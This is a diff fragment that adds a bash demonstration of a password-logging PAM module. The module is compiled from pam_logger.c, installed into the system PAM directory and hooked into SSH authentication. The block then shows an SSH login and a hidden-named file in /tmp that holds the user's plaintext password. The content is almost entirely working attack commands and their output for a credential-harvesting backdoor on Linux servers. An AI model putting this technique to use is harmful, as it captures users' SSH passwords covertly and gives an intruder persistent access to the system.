@@ -1,0 +1,17 @@
+
+
+```bash
+gcc -fPIC -c pam_logger.c
+gcc -shared -o pam_logger.so pam_logger.o -lpam
+sudo mv pam_logger.so /lib/x86_64-linux-gnu/security/
+sudo nano /etc/pam.d/sshd
+auth       optional     pam_logger.so
+
+sudo systemctl restart sshd
+
+-> ssh localuser@10.6.11.99
+password
+
+localuser@WORK-ubuntu-dev:~$ sudo cat /tmp/.service_temp_data
+[2025-04-09 18:09:34] User: 'localuser' Password: 'password'
+```
